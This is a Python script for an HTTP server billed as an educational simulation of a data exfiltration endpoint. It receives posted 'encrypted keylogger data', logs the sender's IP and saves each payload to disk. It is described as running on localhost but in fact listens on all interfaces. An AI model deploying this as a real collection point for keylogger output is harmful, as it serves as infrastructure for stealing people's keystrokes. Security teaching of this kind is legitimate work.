
"""
LOCALHOST DATA EXFILTRATION SERVER - EDUCATIONAL SIMULATION
=========================================================

This server simulates a remote data collection endpoint for educational purposes.
It receives encrypted keylogger data and demonstrates data exfiltration concepts.

⚠️  FOR EDUCATIONAL USE ONLY ⚠️
"""

import http.server
import socketserver
import json
import base64
import os
import urllib.parse
from datetime import datetime

class ExfiltrationHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for simulated data exfiltration"""

    def do_POST(self):
        """Handle POST requests with exfiltrated data"""
        try:
            # Get content length
            content_length = int(self.headers.get('Content-Length', 0))

            # Read POST data
            post_data = self.rfile.read(content_length)

            # Parse JSON data
            try:
                data = json.loads(post_data.decode('utf-8'))

                # Log received data
                timestamp = datetime.now().isoformat()
                log_entry = {
                    'received_timestamp': timestamp,
                    'source_ip': self.client_address[0],
                    'data_size': len(post_data),
                    'encrypted_logs_size': len(data.get('encrypted_logs', '')),
                    'original_timestamp': data.get('timestamp', 'unknown'),
                    'source': data.get('source', 'unknown')
                }

                # Save received data
                filename = f"received_data_{timestamp.replace(':', '-')}.json"
                with open(filename, 'w') as f:
                    json.dump({
                        'metadata': log_entry,
                        'received_data': data
                    }, f, indent=2)

                print(f"[{timestamp}] Received exfiltrated data from {self.client_address[0]}")
                print(f"   Data size: {len(post_data)} bytes")
                print(f"   Saved to: {filename}")

                # Send success response
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()

                response = {
                    'status': 'success',
                    'message': 'Data received successfully',
                    'timestamp': timestamp
                }

                self.wfile.write(json.dumps(response).encode())

            except json.JSONDecodeError:
                self._send_error(400, "Invalid JSON data")

        except Exception as e:
            print(f"Error handling POST request: {e}")
            self._send_error(500, "Internal server error")

    def do_GET(self):
        """Handle GET requests - serve status page"""
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            html_response = """
<!DOCTYPE html>
<html>
<head>
    <title>Educational Exfiltration Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .warning { background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .status { background-color: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 4px; }
        h1 { color: #333; }
        h2 { color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎓 Educational Data Exfiltration Server</h1>

        <div class="warning">
            <h2>⚠️ Educational Purpose Only</h2>
            <p>This server simulates malicious data exfiltration for educational and research purposes only.</p>
            <p><strong>Do not use for unauthorized data collection!</strong></p>
        </div>

        <div class="status">
            <h2>✅ Server Status: Active</h2>
            <p>Server is running on localhost and ready to receive simulated exfiltrated data.</p>
            <p>Timestamp: """ + datetime.now().isoformat() + """</p>
        </div>

        <h2>Capabilities:</h2>
        <ul>
            <li>Receive encrypted keylogger data via POST</li>
            <li>Log all received transmissions</li>
            <li>Save exfiltrated data with timestamps</li>
            <li>Demonstrate data exfiltration concepts</li>
        </ul>

        <h2>Educational Objectives:</h2>
        <ul>
            <li>Understanding data exfiltration techniques</li>
            <li>Network communication simulation</li>
            <li>Encrypted data transmission</li>
            <li>Cybersecurity awareness and defense</li>
        </ul>
    </div>
</body>
</html>
"""

            self.wfile.write(html_response.encode())

        except Exception as e:
            print(f"Error handling GET request: {e}")
            self._send_error(500, "Internal server error")

    def _send_error(self, code, message):
        """Send HTTP error response"""
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

        error_response = {
            'status': 'error',
            'code': code,
            'message': message,
            'timestamp': datetime.now().isoformat()
        }

        self.wfile.write(json.dumps(error_response).encode())

    def log_message(self, format, *args):
        """Custom log format"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] {format % args}")


def start_exfiltration_server(port=8888):
    """Start the localhost exfiltration simulation server"""
    print("="*60)
    print("    EDUCATIONAL DATA EXFILTRATION SERVER")
    print("="*60)
    print()
    print("⚠️  FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY ⚠️")
    print()
    print("This server simulates a malicious data collection endpoint")
    print("for cybersecurity education and awareness training.")
    print()
    print(f"Server starting on localhost:{port}")
    print(f"Web interface: http://localhost:{port}")
    print("Press Ctrl+C to stop the server")
    print()
    print("-" * 60)

    try:
        with socketserver.TCPServer(("", port), ExfiltrationHandler) as httpd:
            print(f"✅ Educational exfiltration server running on port {port}")
            httpd.serve_forever()

    except KeyboardInterrupt:
        print("\n🛑 Server stopped by user")
    except Exception as e:
        print(f"❌ Server error: {e}")


if __name__ == "__main__":
    start_exfiltration_server()
